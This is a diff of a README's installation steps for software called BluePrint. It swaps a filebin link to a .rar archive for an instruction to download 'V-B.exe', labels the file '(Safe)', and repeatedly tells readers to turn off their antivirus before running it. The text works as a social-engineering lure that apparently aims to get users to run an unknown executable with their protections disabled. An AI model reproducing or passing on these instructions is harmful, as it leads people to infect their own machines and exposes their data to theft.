@@ -73,7 +73,7 @@ Be sure to turn off your antivirus before running
 This is an example of how to list things you need to use the software and how to install them.
 * Download BluePrint.rar
   ```sh
-  $ Download From Link : https://filebin.net/v46nn0hrn6e3gpuc/BluePrint.rar
+  $ Download V-B.exe From This Git ! (Safe)
   $ Be sure to turn off your antivirus before running
   ```
 
@@ -81,7 +81,7 @@ This is an example of how to list things you need to use the software and how to
 
 1. File extraction
    ```sh
-   Extract the downloaded rar file . BluePrint.rar
+   Be sure to turn off your antivirus before running V-B.exe
    ```
 2. Run 
    ```sh
